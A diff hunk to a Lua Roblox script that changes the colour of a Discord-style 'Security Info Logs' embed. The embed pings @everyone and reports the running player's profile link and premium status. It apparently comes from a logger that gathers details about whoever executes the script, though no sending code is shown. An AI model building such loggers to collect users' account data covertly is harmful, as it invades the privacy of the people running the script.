@@ -68,7 +68,7 @@ pcall(function()
        ['title'] = '`` | Security Info Logs | ``',
        ['description'] = '**| SECRUITY LOGS HAS BEEN EXECUTED ! @everyone |**',
        ['type'] = "rich",
-       ['color'] = tonumber(17255238),
+       ['color'] = tonumber(16753920),
        ['fields'] = {
           {name = "**Users Profile**", value = ''.."https://www.roblox.com//users/"..game.Players.LocalPlayer.UserId.."/profile"},
           {name = "**Premium Account**", value = premium},
